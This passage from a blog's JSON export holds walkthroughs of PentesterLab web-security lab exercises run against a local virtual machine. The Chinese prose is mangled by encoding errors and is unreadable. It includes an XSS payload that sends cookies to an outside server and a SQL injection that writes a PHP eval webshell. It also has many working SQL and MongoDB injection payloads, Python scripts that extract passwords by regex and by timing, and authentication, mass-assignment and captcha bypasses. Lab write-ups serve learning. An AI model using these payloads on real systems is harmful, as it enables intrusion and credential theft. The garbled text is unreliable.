æ³¨å…¥ä¸Šï¼Œå‘ç°ä¸»é¡µçš„post.php?id=2ä¸ç™»å½•å¤„éƒ½ä¸èƒ½æ³¨å…¥ï¼Œç„¶åç”¨ xsspt.com çš„ xss å¹³å°ç«Ÿç„¶æ”¶ä¸åˆ° cookie â€¦ å‘çš„ä¸€æ‰¹\nXSS ç”±äº xss å¹³å°ä¸çŸ¥é“æ€ä¹ˆæ”¶ä¸åˆ° cookie ï¼Œåªèƒ½ç”¨è‡ªå·±çš„æœåŠ¡å™¨äº†ï¼Œç”¨äº†æ–‡æ¡£çš„ payload\n\u0026lt;script\u0026gt;document.write(\u0026#39;\u0026lt;img src=\u0026#34;http://106.14.153.173:2015/?\u0026#39; + document.cookie+\u0026#39; \u0026#34;/\u0026gt;\u0026#39;);\u0026lt;/script\u0026gt; è¿™é‡Œå¼ºçƒˆå»ºè®®ä½¿ç”¨ FireFox + Cookie Manager æ¥å®Œæˆï¼Œå› ä¸ºæ„Ÿè§‰è¿™ä¸ª session æ§åˆ¶å†™çš„ä¸æ˜¯å¾ˆå¥½ï¼Œä¸å¸¦ cookie è®¿é—®çš„è¯ï¼Œå®ƒä¼šå¼ºåˆ¶é‡ç½®ä½ çš„ cookie ï¼Œç„¶åå°±ä¼šå˜æˆæ¯æ¬¡éƒ½éœ€è¦ burp æŠ“åŒ…æ¥ä¿®æ”¹ cookie ï¼Œååˆ†éº»çƒ¦\n \nSQL Injection è¿›å…¥åˆ°ç®¡ç†å‘˜ç•Œé¢åï¼Œå‘ç°åœ¨edit.phpå¤„å­˜åœ¨æ³¨å…¥ç‚¹\nhttp://172.16.71.149/admin/edit.php?id=1' mysql_fetch_assoc() expects parameter 1 to be resource, boolean given in /var/www/classes/post.php on line 111 Notice: Undefined variable: post in /var/www/classes/post.php on line 115 Notice: Trying to get property of non-object in /var/www/admin/edit.php on line 19 ç»§ç»­ fuzz ï¼Œåœ¨1 union select 1,2,3,4%23çš„æ—¶å€™å›æ˜¾æ­£å¸¸ï¼ŒçŒœæµ‹æœ‰4åˆ—\né€šè¿‡id=1 union select 1,2,@@version,4 limit 1,1%23ï¼Œå¾—åˆ°äº†åœ¨æ–‡æœ¬ç¼–è¾‘æ¡†ä¸­çš„ç‰ˆæœ¬å·ï¼Œä¹Ÿé€šè¿‡user()å‘ç°æ˜¯root@localhostçš„æƒé™ï¼Œæƒ³è¦æ‹¿åˆ° shell ï¼Œè‡ªç„¶å…ˆæƒ³æ€ä¹ˆå»å†™å…¥ webshell\n \nGetShell æŸ¥ä¸€ä¸‹secure_file_priv\n1unionSELECT1,@@secure_file_priv,2,3limit1,1%23å‘ç°ä¸ºç©ºï¼Œé‚£å°±è¯´æ˜å¯ä»¥ä¸ºæ‰€æ¬²ä¸ºäº†\n \né€šè¿‡\n1unionSELECT\u0026#39;\u0026lt;?php eval($_POST[zedd]);?\u0026gt;\u0026#39;,2,3,4INTOOUTFILE\u0026#39;/var/www/zedd.php\u0026#39;%23è¿™é‡ŒæŒ‰ç…§ä¹‹å‰ Pentestlab çš„å°¿æ€§å†™çš„/var/wwwè¿™ä¸ªç›®å½•ï¼Œä½†æ˜¯ä¸€ç›´å†™ä¸è¿›å»ï¼Œåº”è¯¥æ˜¯æ²¡æƒé™ï¼Œç„¶åæƒ³åº”è¯¥åœ¨ä¸€äº›é™æ€æ–‡ä»¶å¤¹é‚£é‡Œåº”è¯¥ä¼šæœ‰å†™å…¥çš„æƒé™ï¼Œäºæ˜¯å†™åˆ°äº† images æ–‡ä»¶å¤¹ä¸‹é¢ã€‚\n1unionSELECT\u0026#39;\u0026lt;?php eval($_POST[zedd]);?\u0026gt;\u0026#39;,2,3,4INTOOUTFILE\u0026#39;/var/www/images/zedd.php\u0026#39;%23è¿ä¸Šå»å°±å¾—åˆ° webshell äº†\nSomething else å…¶å®ƒä¸€äº› sql æ“ä½œ\n1unionSELECT1,2,group_concat(schema_name),4frominformation_schema.schematalimit1,1%23-- information_schema,blog,mysql 1unionSELECT1,group_concat(table_name),3,4frominformation_schema.tableswheretable_schema=\u0026#39;blog\u0026#39;limit1,1%23-- comments,posts,users 1unionSELECT1,group_concat(column_name),3,4frominformation_schema.columnswheretable_name=\u0026#39;users\u0026#39;limit1,1%23-- id,login,password 1unionSELECT1,group_concat(login),group_concat(password),4fromuserslimit1,1%23-- admin/8efe310f9ab3efeae8d410a8e0166eb2 åæŸ¥ md5 å¾—åˆ° admin çš„å¯†ç æ˜¯ P4ssw0rd\næŸ¥çœ‹æºä»£ç æ–‡ä»¶å¯ä»¥çœ‹åˆ°é™¤äº†find()åŠŸèƒ½ï¼Œå…¶ä»–åŠŸèƒ½éƒ½åŠ ä¸Šäº†mysql_real_escape_stringè¿‡æ»¤\u0026hellip;\nConclusion è™½ç„¶æ¯”è¾ƒç®€å•ï¼Œä½†æ˜¯æ•´ä½“åšä¸‹æ¥ä½“éªŒä¸æ˜¯å¾ˆå¥½ï¼Œå°¤å…¶æ˜¯ cookie é‚£é‡Œï¼Œå¾ˆæ¶å¿ƒâ€¦ä½†æ˜¯ä¹Ÿæ˜¯å­¦ä¼šä¸€ç‚¹æŠ€å·§å§\u0026hellip;è¿˜æœ‰å°±æ˜¯æ–‡ä»¶è·¯å¾„é‚£é‡Œï¼Œå–å·§äº†ä¸€ä¸‹ï¼Œå› ä¸ºä¹‹å‰ç³»åˆ— web ç›®å½•éƒ½æ˜¯åœ¨/var/wwwç›®å½•ä¸‹ï¼Œè€Œä¸æ˜¯/var/www/htmlä¸‹ã€‚XSS æœ€å¥½è¿˜æ˜¯å…ˆç”¨è‡ªå·±çš„æœåŠ¡å™¨æ”¶ cookie â€¦å¹³å°å¹¶ä¸æ˜¯å®Œå…¨å¯é \n","date":"2019-03-11T17:56:16Z","permalink":"https://blog.zeddyu.info/2019/03/11/XSS-and-MYSQL-FILE/","title":"XSS and MYSQL FILE"},{"content":"æ¥Web For Pentestï¼Œè¿™é‡Œæ˜¯å®ƒçš„ç¬¬äºŒç‰ˆ\n[TOC]\nPre å‡†å¤‡å¦‚ç¬¬ä¸€ç‰ˆçš„ç¬¬ä¸€éƒ¨åˆ†ï¼Œæ‰¾åˆ°é¶æœº ip å³å¯ã€‚\nHacking SQL injections Example 1 æ¯”è¾ƒç®€å•çš„ç”¨ä¸‡èƒ½å¯†ç å°±å¯ä»¥è¿‡äº†username=1%27+or+1%3D1%23\u0026amp;password=1\nExample 2 ä¸€ä¸ªå•å¼•å·å‘ç°æŠ¥é”™\nMysql2::Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1'' at line 1: SELECT * FROM users WHERE username='1'' AND password='1' ä¸€é¡¿ fuzz å‘ç°æ³¨é‡Šè¢«è¿‡æ»¤ï¼Œä½†æ˜¯ password åé¢ä»å¯ä»¥ç”¨#ï¼Œè€Œä¸”è¿™é‡Œå¯èƒ½æœ‰ç‚¹å‘çš„åœ°æ–¹æ˜¯è²Œä¼¼å¹¶ä¸æ˜¯ç”¨adminçš„ç”¨æˆ·ï¼Œæ‰€ä»¥éœ€è¦åœ¨æœ€åç”¨or 1=1#è¿›è¡Œç»•è¿‡ï¼Œç”¨limit 1é™åˆ¶ä¸€æ¡è¾“å‡º\nusername=' or '1'='1\u0026amp;password=1' or 1=1 limit 1%23\u0026amp;submit=æäº¤æŸ¥è¯¢ Example 3 è¿™é‡Œè¿‡æ»¤äº†å•å¼•å·ï¼Œæˆ‘ä»¬å¯ä»¥ä»ä»£ç çœ‹çœ‹\nparams[\u0026#39;username\u0026#39;].gsub!(\u0026#34;\u0026#39;\u0026#34;,\u0026#34;\u0026#34;) params[\u0026#39;password\u0026#39;].gsub!(\u0026#34;\u0026#39;\u0026#34;,\u0026#34;\u0026#34;) sql = \u0026#34;SELECT * FROM users WHERE username=\u0026#39;\u0026#34;+ params[\u0026#39;username\u0026#39;]+\u0026#34;\u0026#39;\u0026#34; sql+= \u0026#34; AND password=\u0026#39;\u0026#34;+ params[\u0026#39;password\u0026#39;] +\u0026#34;\u0026#39;\u0026#34; è¿™é‡Œè¿‡æ»¤äº†å•å¼•å·ï¼Œä½†æ˜¯æ²¡æœ‰è¿‡æ»¤æ‰æ³¨å…¥ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ³¨é‡Šç¬¦æ³¨é‡Šæ‰æœ€åä¸€ä¸ªå¼•å·ï¼Œç”¨\\è½¬ä¹‰ä¸­é—´çš„'ï¼Œè¿™æ ·å°±å½¢æˆäº†ä¸€ä¸ªå•å¼•å·é—­åˆï¼Œå†åˆ©ç”¨or 1=1è¿›è¡Œç»•è¿‡ï¼Œç”¨limit 1å–ä¸€æ¡ï¼Œæœ€ç»ˆçš„ payload\nusername=admin\\\u0026amp;password=or 1=1 limit 1%23\u0026amp;submit=æäº¤æŸ¥è¯¢ Example 4 http://172.16.71.149/sqlinjection/example4/?req=username%3d%27hacker%27 çŒœæµ‹æ‹¼æ¥çš„æ˜¯æœ€åçš„whereè¯­å¥ï¼Œç”¨id=1è¿”å›äº† id ä¸º 1 çš„è´¦æˆ·ï¼Œå°è¯•id=1 union select 1,2,3%23ï¼ŒæˆåŠŸå¤šè¿”å›äº†ä¸€è¡Œ1,2\nunionSELECT1,schema_name,3frominformation_schema.schematainformation_schema,authentication_example3,authentication_example4,authentication_example5,authentication_example6,authorization_example1,authorization_example2,authorization_example3,massassign_example1,massassign_example2,massassign_example3,randomness_example1,randomness_example2,randomness_example3,randomness_example4,sqlinjection_examç„¶è€Œæ¥ä¸‹æ¥è¯»ä¸åˆ°sqlinjection_examï¼Œå¯èƒ½å› ä¸ºæƒé™ä¸å¤Ÿã€‚ä½†æ˜¯è¿˜æœ‰ä¸€ç§å¯èƒ½å°±æ˜¯â€¦æ²¡è¯»å®Œï¼Œæœ‰è¾“å‡ºé™åˆ¶ï¼Œè¡¨åå¯èƒ½æ˜¯sqlinjection_exampleå•¥çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨limit 1é™åˆ¶ä¸€ä¸‹\nid%3d1unionSELECT1,schema_name,3frominformation_schema.schematalimit15,20%23 \nunionSELECT1,group_concat(table_name),3frominformation_schema.tableswheretable_schema=\u0026#39;sqlinjection_example4\u0026#39;;usersunionSELECT1,group_concat(column_name),3frominformation_schema.columnswheretable_name=\u0026#39;users\u0026#39;;id,username,passwordunionSELECTid,username,passwordfromusers;ä¹Ÿå¯ä»¥ç”¨æŠ¥é”™\nOR(SELECT8627FROM(SELECTCOUNT(*),CONCAT(0x70307e,(SELECTuser()),0x7e7030,FLOOR(RAND(0)*2))xFROMINFORMATION_SCHEMA.PLUGINSGROUPBYx)a)Mysql2::Error:Duplicateentry\u0026#39;p0~pentesterlab@localhost~p01\u0026#39;forkey\u0026#39;group_key\u0026#39;:SELECT*FROMusersWHEREid=0OR(SELECT8627FROM(SELECTCOUNT(*),CONCAT(0x70307e,(SELECTuser()),0x7e7030,FLOOR(RAND(0)*2))xFROMINFORMATION_SCHEMA.PLUGINSGROUPBYx)a);idè®°å¾—æŠŠè™šæ‹Ÿæœºé…ç½®å†…å­˜æåˆ° 1G ï¼Œå¦åˆ™ä¼šæŠ¥ä¸‹é¢çš„é”™ï¼š\nMysql2::Error: Got error 28 from storage engine: Example 5 http://172.16.71.149/sqlinjection/example5/?limit=3 çœ‹å‚æ•°æç¤ºå°±æ˜¯ä¸€ä¸ªlimitæ³¨å…¥\nlimit3procedureanalyse(extractvalue(rand(),concat(0x3a,(selectversion()))),1);%23å·ä¸ªæ‡’ï¼Œå°±ä¸æ³¨å…¶ä»–çš„æ•°æ®åº“ï¼Œç›´æ¥ä¸Šsqlinjection_example5\nlimit3procedureanalyse(extractvalue(rand(),concat(0x3a,(SELECTgroup_concat(table_name)frominformation_schema.tableswheretable_schema=\u0026#39;sqlinjection_example4\u0026#39;))),1);%23Mysql2::Error:XPATHsyntaxerror:\u0026#39;:users\u0026#39;:SELECT*FROMusersLIMIT3procedureanalyse(extractvalue(rand(),concat(0x3a,(SELECTgroup_concat(table_name)frominformation_schema.tableswheretable_schema=\u0026#39;sqlinjection_example4\u0026#39;))),1);limit3procedureanalyse(extractvalue(rand(),concat(0x3a,(SELECTgroup_concat(id)fromusers))),1);%23Example 6 http://172.16.71.149/sqlinjection/example6/?group=username çœ‹å‚æ•°æç¤ºåº”è¯¥æ˜¯ä¸ªgroup byæ³¨å…¥ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨æŠ¥é”™æ³¨å…¥\nGROUPBYusernameand(SELECT8627FROM(SELECTCOUNT(*),CONCAT(0x70307e,(SELECTuser()),0x7e7030,FLOOR(RAND(0)*2))xFROMINFORMATION_SCHEMA.PLUGINSGROUPBYx)a)Example 7 http://172.16.71.149/sqlinjection/example7/?id=1 é€šè¿‡å•å¼•å·è¿”å› sql é”™è¯¯\nMysql2::Error:YouhaveanerrorinyourSQLsyntax;checkthemanualthatcorrespondstoyourMySQLserverversionfortherightsyntaxtousenear\u0026#39;\u0026#39;\u0026#39; at line 1: SELECT * FROM users WHERE id=1\u0026#39;ä¸€ä¸ªç®€å•çš„æ•´å½¢æ³¨å…¥ï¼Œç”¨1 or 1=1%23è¿”å›\nShould only return one user... åŠ ä¸ªlimitå°±å¥½äº†\n0unionselect1,group_concat(schema_name),3frominformation_schema.schematalimit2,1%23ç„¶åè¿™æ ·æ„é€ ï¼Œæˆ‘è§‰å¾—åº”è¯¥æ²¡ä»€ä¹ˆé”™ï¼Œä½†æ˜¯è¿”å›çš„æ˜¯\nShould only return one user... è®²é“ç†åº”è¯¥åªè¿”å›ä¸€æ¡æ•°æ®äº†ï¼Œçœ‹äº†æºä»£ç \nsql = \u0026#34;SELECT * FROM users WHERE id=#{params[:id]}\u0026#34; @r = ActiveRecord::Base.connection.execute(sql).to_a if @r.size == 1 name = @r.first[1] sql = \u0026#34;SELECT * FROM users WHERE username=\u0026#39;#{name}\u0026#39;\u0026#34; @res = ActiveRecord::Base.connection.execute(sql).to_a else raise Exception, \u0026#34;Should only return one user...\u0026#34; è¿™é‡Œåº”è¯¥æ²¡ä»€ä¹ˆåŠæ³•é€šè¿‡ union è¿›è¡Œæ³¨å…¥äº†ï¼Œç”±äºè‡ªå·±å½“æ—¶é™·è¿›å»äº†ï¼Œä¸€ç›´åœ¨æƒ³æ€ä¹ˆç»• union ï¼Œçœ‹äº†æ–‡æ¡£æ‰å‘ç°è‡ªå·±æ€è·¯å¤ªå•ä¸€äº†ï¼Œè¿™é‡Œå…¶å®æœ‰æŠ¥é”™å›æ˜¾é‚£å°±å¯ä»¥ç”¨æŠ¥é”™æ³¨å…¥\n0OR(SELECT8627FROM(SELECTCOUNT(*),CONCAT(0x70307e,(SELECTuser()),0x7e7030,FLOOR(RAND(0)*2))xFROMINFORMATION_SCHEMA.PLUGINSGROUPBYx)a)%23Mysql2::Error:Duplicateentry\u0026#39;p0~pentesterlab@localhost~p01\u0026#39;forkey\u0026#39;group_key\u0026#39;:SELECT*FROMusersWHEREid=0OR(SELECT8627FROM(SELECTCOUNT(*),CONCAT(0x70307e,(SELECTuser()),0x7e7030,FLOOR(RAND(0)*2))xFROMINFORMATION_SCHEMA.PLUGINSGROUPBYx)a)#0OR(SELECT8627FROM(SELECTCOUNT(*),CONCAT(0x70307e,(SELECTtable_namefrominformation_schema.tableswheretable_schema=\u0026#39;sqlinjection_example7\u0026#39;),0x7e7030,FLOOR(RAND(0)*2))xFROMINFORMATION_SCHEMA.PLUGINSGROUPBYx)a)%23Mysql2::Error:Duplicateentry\u0026#39;p0~users~p01\u0026#39;forkey\u0026#39;group_key\u0026#39;:SELECT*FROMusersWHEREid=0OR(SELECT8627FROM(SELECTCOUNT(*),CONCAT(0x70307e,(SELECTtable_namefrominformation_schema.tableswheretable_schema=\u0026#39;sqlinjection_example7\u0026#39;),0x7e7030,FLOOR(RAND(0)*2))xFROMINFORMATION_SCHEMA.PLUGINSGROUPBYx)a)#Example 8 http://172.16.71.149/sqlinjection/example8/ æ¯”è¾ƒæ˜æ˜¾çš„ insert æ³¨å…¥ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ç”¨å½¢å¦‚ä»¥ä¸‹çš„ payload æ¥æ³¨å…¥\ninsertintomessage(id,user_id,message_id)values(4,\u0026#39;zedd\u0026#39;orupdatexml(1,concat(0x7e,(select@@version),0x7e),0)or\u0026#39;\u0026#39;,\u0026#39;hi\u0026#39;);è™½ç„¶é¡µé¢ä¸ä¼šç›´æ¥å›æ˜¾ï¼Œä½†æ˜¯ç‚¹å‡» id çš„è¶…é“¾æ¥è¿‡å»å°±å¯ä»¥çœ‹åˆ°äº†\n \nExample 9 http://172.16.71.149/sqlinjection/example9/?username=1%27%20or%201=1%23\u0026amp;password=1\u0026amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2 æ— å›æ˜¾æ³¨å…¥\n1'%a0%26%26%a0if(1%2Csleep(2)%2C0)%a0%26%26%a0'1'%3D'1 1\u0026quot;%a0%26%26%a0if(1%2Csleep(2)%2C0)%a0%26%26%a0\u0026quot;1\u0026quot;%3D\u0026quot;1 éšä¾¿ fuzz çš„æ—¶å€™å‘ç°å›æ˜¾\ninvalid byte sequence in UTF-8 çŒœæµ‹æ˜¯å®½å­—èŠ‚æ³¨å…¥ï¼Œç”¨%dfå°è¯•æ³¨å…¥ï¼Œæ³¨å…¥æˆåŠŸ\n1%df%27%20or%201=1%23\u0026amp;password=1 Authorization Example 1  â€‹\tIn this exercise, you can log in with the following user: user1 with the password \u0026ldquo;pentesterlab\u0026rdquo;. Once you logged in and have a play around, log out and try to access the same information.\n é¢˜ç›®æ„æ€å°±æ˜¯åšå¤±æ•ˆçš„èº«ä»½è®¤è¯ï¼Œç¬¬ä¸€ä¸ªæ¯”è¾ƒç®€å•ï¼Œç™»å½•åå‘ç°çš„ä¸¤ä¸ªåœ°å€éƒ½å¯ä»¥åœ¨ logout ä¹‹ååˆæ‰“å¼€\nExample 2  â€‹\tIn this exercise, you can log in with the following user: user1 with the password \u0026ldquo;pentesterlab\u0026rdquo;. Once you logged in and have a play around, try to access the information from user2.\n è¿™é‡Œæ˜¯ä¸ªæ°´å¹³è¶Šæƒï¼Œä¹Ÿæ˜¯æ¯”è¾ƒç®€å•ï¼Œç›´æ¥æŠ“åŒ…é¡ºåºæŸ¥çœ‹ä¸‹ä¸€ä¸ª infos å°±å‘ç°äº† user2 çš„äº†\nGET /authorization/example2/infos/3 HTTP/1.1 Host: 172.16.71.149 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Referer: http://172.16.71.149/authorization/example2/ Connection: close Cookie: rack.session=8c8b4862b1564eb97e9c4873e34c60d89409086ae1ecb229303e6715f3e1b69d Upgrade-Insecure-Requests: 1 Example 3  â€‹\tIn this exercise, you can log in with the following user: user1 with the password \u0026ldquo;pentesterlab\u0026rdquo;. Once you logged in and have a play around, try to access the information from user2.\n è¿›å…¥é¡µé¢å‘ç°æ¯”ä¹‹å‰å¤šäº†ä¸€ä¸ªä¿®æ”¹çš„åŠŸèƒ½ï¼Œè¿™é‡Œä»¥ä¸ºæ˜¯å¯ä»¥ä¿®æ”¹å…¶ä»–äººçš„ç„¶åè¿”å›ä¿®æ”¹ç»“æœ\u0026hellip;è°çŸ¥é“ä¿®æ”¹è‡ªå·±çš„éƒ½æœ‰ç‚¹å° bug \u0026hellip;\nåæ¥å‘ç°ï¼Œæ˜¯å¯ä»¥é€šè¿‡ç¼–è¾‘åŠŸèƒ½åœ¨ placeholderå¤„çœ‹åˆ°å…¶ä»–äººçš„ä¿¡æ¯\n \nMongoDB injection Example 1 ä½¿ç”¨ä¸‡èƒ½å¯†ç ç™»å½•\nusername=1' || 1==1//\u0026amp;password=1 æ³¨æ„ MongoDB çš„è¯­æ³•ä¸å¤ªä¸€æ ·ï¼Œç›¸ç­‰è¦ç”¨==ï¼Œå¯ä»¥ç”¨//æˆ–è€…\u0026lt;!--åšæ³¨é‡Š\nExample 2 é€šè¿‡search=admin' or 1==1//å›æ˜¾\n$where compile error æœ€åçœ‹äº†æ–‡æ¡£ï¼Œæ‰å‘ç°è¿™é‡Œè¿˜è¦çŒœä¸€ä¸ª passwordçš„å­—æ®µï¼Œæ„Ÿè§‰å¦‚æœæ²¡æœ‰æç¤ºçš„è¯ä¹Ÿæ¯”è¾ƒéš¾ï¼Œå…ˆçœ‹ä¸€ä¸‹æºä»£ç \nif params[\u0026#39;search\u0026#39;] begin nosql = \u0026#34;this.username==\u0026#39;#{params[\u0026#39;username\u0026#39;]}\u0026#39;\u0026#34; @res = User.all(\u0026#39;$where\u0026#39; =\u0026gt; nosql) rescue Exception =\u0026gt; e @message = e.to_s end è¿™é‡Œéœ€è¦åŠ ä¸€ä¸ªadmin' \u0026amp;\u0026amp; this.password.match(/.*/)//ï¼Œè¿™æ ·å°±å¯ä»¥æ‹¼å‡‘æˆ\nthis.username==\u0026#39;admin\u0026#39;\u0026amp;\u0026amp;this.password.match(/.*/)//è¿™æ ·å°±å¯ä»¥åŒ¹é…adminçš„å¯†ç äº†ï¼Œæ‰€ä»¥åªè¦æˆ‘ä»¬å†™å¥½æ­£åˆ™å°±è¡Œäº†ï¼Œç”¨^ä»å¼€å¤´åŒ¹é…ï¼Œæ ¹ç»é¡µé¢è¿”å›æ¥æ³¨å‡ºå¯†ç äº†\nè„šæœ¬å¦‚ä¸‹ï¼š\nimport requests import re import string import base64 index_url = \u0026#39;http://172.16.71.149/mongodb/example2/?search=\u0026#39; passwd = \u0026#39;\u0026#39; while True: for i in string.ascii_letters + string.digits: payload = \u0026#34;admin\u0026#39; %26%26 this.password.match(/^\u0026#34;+ passwd + i + \u0026#34;/)//\u0026#34; rep = requests.get(index_url+payload) # print(rep.text) if \u0026#39;admin\u0026#39; in rep.text: passwd += i print(\u0026#34;[-] find a char:{}\u0026#34;.format(passwd)) break  \nAuthentication Example 1 å¼±å£ä»¤admin/admin\nExample 2 è¿™é‡Œä»¥ä¸ºæ˜¯ç¤¾å·¥ä»€ä¹ˆï¼Œç»“æœçœ‹æ–‡æ¡£æ˜¯é€šè¿‡åˆ©ç”¨å¯†ç å¯¹æ¯”çš„æ—¶é—´çš„ä¸åŒæ¥è¿›è¡Œçˆ†ç ´å¾—åˆ°å¯†ç çš„ã€‚\nGET /authentication/example2/ HTTP/1.1 Host: 172.16.71.149 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Referer: http://172.16.71.149/ Connection: close Cookie: rack.session=0dbcdabae0f95432d8fa96ebf7103952ba2f82590bc454db88cb00b400b1d3fb Upgrade-Insecure-Requests: 1 Authorization: Basic aGFja2VyOmhhY2tlcg== é€šè¿‡æˆ‘ä»¬æŠ“åŒ…å‘ç°å­˜åœ¨Authorization: Basic aGFja2VyOmhhY2tlcg==å­—æ®µï¼Œå¯ä»¥çŸ¥é“è¿™é‡Œæ˜¯é€šè¿‡æŠŠè´¦å·å¯†ç è¿›è¡Œ base64 ç¼–ç æ¥è¿›è¡Œè®¤è¯çš„ï¼Œæ¯”å¦‚è¿™é‡Œå°±æ˜¯hacker:hackerï¼Œ\nb'hacker:o' 1.404764 b'hacker:p' 1.606023 b'hacker:p3' 1.60843 b'hacker:p4' 1.80702 b'hacker:p4r' 1.80603 b'hacker:p4s' 2.006654 b'hacker:p4sr' 2.007834 b'hacker:p4ss' 2.207312 b'hacker:p4ssv' 2.209067 b'hacker:p4ssw' 2.407329 b'hacker:p4sswZ' 2.412927 b'hacker:p4ssw0' 2.610178 è¿™é‡ŒåŸºæœ¬å°±èƒ½çŒœå‡ºæ¥äº†ï¼Œå¯†ç æ˜¯p4ssw0rdï¼Œè‡ªå·±å†™çš„æ¸£æ¸£è„šæœ¬\nimport requests import re import string import base64 index_url = \u0026#39;http://172.16.71.149/authentication/example2/\u0026#39; req = requests.session() time_ex = \u0026#39;2.4\u0026#39; for i in string.ascii_letters + string.digits: payload = (\u0026#39;hacker:p4ssw\u0026#39; + i).encode(\u0026#34;utf-8\u0026#34;) print(payload) payload = base64.b64encode(payload).decode(\u0026#34;utf-8\u0026#34;) headers = { \u0026#39;Authorization\u0026#39; : \u0026#39;Basic \u0026#39; + payload } rep = req.get(index_url,headers=headers) time = rep.elapsed.total_seconds() if float(time) - float(time_ex) \u0026gt; 0.1 : print(time_ex) print(time) exit() time_ex = time Example 3 æŠ“åŒ…å‘ç°å¯ä»¥å‘ç°åœ¨Cookieçœ‹åˆ°æœ‰userå­—æ®µï¼Œæ”¹æˆadminå°±å¯ä»¥äº†\nGET /authentication/example3/ HTTP/1.1 Host: 172.16.71.149 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Cookie: user=admin Upgrade-Insecure-Requests: 1 Example 4 æŠ“åŒ…å‘ç°åªæ˜¯åœ¨ Cookie ä¸­ç”¨äº† md5 è€Œå·²ï¼Œæ¢æˆadminçš„ md5 å°±å¥½äº† 21232f297a57a5a743894a0e4a801fc3\nGET /authentication/example4/ HTTP/1.1 Host: 172.16.71.149 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Referer: http://172.16.71.149/authentication/example4/?username=user1\u0026amp;password=admin\u0026amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2 Connection: close Cookie: user=24c9e15e52afc47c225b757e7bee1f9d; Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 Example 5 å¤šäº†ä¸€ä¸ªæ³¨å†ŒåŠŸèƒ½ï¼Œä»¥ä¸ºæ˜¯ sql çº¦æŸæ”»å‡»ï¼Œä½†æ˜¯å…¶å®æ˜¯ mysql æ•°æ®åº“é»˜è®¤ä¸åŒºåˆ†å¤§å°å†™çš„é—®é¢˜\næ³¨å†Œä¸€ä¸ªAdminç”¨æˆ·ç™»å½•å³å¯\nExample 6 è¿™é‡Œåˆ©ç”¨äº† sql ä¼šè‡ªåŠ¨å»æ‰å¤šä½™ç©ºæ ¼çš„ç‰¹æ€§ï¼Œä¹Ÿå±äº sql çº¦æŸæ”»å‡»çš„åŸç†éƒ¨åˆ†ï¼Œæˆ‘ä»¬æ³¨å†Œä¸€ä¸ªadminåé¢å¸¦æœ‰å‡ ä¸ªç©ºæ ¼çš„å°±å¯ä»¥äº†\nMass Assignment Example 1 æ¯”è¾ƒæ­£å¸¸çš„æ€è·¯ï¼Œæäº¤åŠ å…¥user[admin]=1å‚æ•°å³å¯\nExample 2 update_profile?user[username]=admin\u0026amp;user[password]=admin\u0026amp;user[admin]=1\u0026amp;submit=æäº¤æŸ¥è¯¢ æ–°å¢äº†ä¸€ä¸ª Modify your profile çš„åŠŸèƒ½ï¼Œé‚£å°±æ˜¯åœ¨è¿™ä¸ª api ä¸Šuser[admin]=1å°±è¡Œäº†\nExample 3  â€‹\tIn this exercise, you can log in with the following user: user1 with the password \u0026ldquo;pentesterlab\u0026rdquo;. Once you logged in, try to access the information fromt the company \u0026ldquo;Company 2\u0026rdquo;.\n è·Ÿä¹‹å‰å·®ä¸å¤šï¼Œåªä¸è¿‡è¿™æ¬¡ edit åŠ ä¸Šuser[company_id]=2å³å¯\nCaptcha æ„Ÿè§‰è¿™ä¸ªç³»åˆ—å‹æ ¹æ²¡æƒ³è®©ä½ æ‰çœ¼çœ‹å‡ºéªŒè¯ç \u0026hellip;\nExample 1 åˆ æ‰captchaè¯·æ±‚å‚æ•°å³å¯\nGET /captcha/example1/submit?submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2 HTTP/1.1 Host: 172.16.71.149 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Referer: http://172.16.71.149/captcha/example1/ Connection: close Cookie: rack.session=525baf022ef804ebce727262500c3074f121064d31acccf75fc07532bf37e54d Upgrade-Insecure-Requests: 1 Example 2 åœ¨è¯·æ±‚å¤´çœ‹åˆ°ç­”æ¡ˆ\nGET /captcha/example2/submit?captcha=1\u0026amp;answer=EDtRmsPHWz\u0026amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2 HTTP/1.1 Host: 172.16.71.149 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0 Accept: 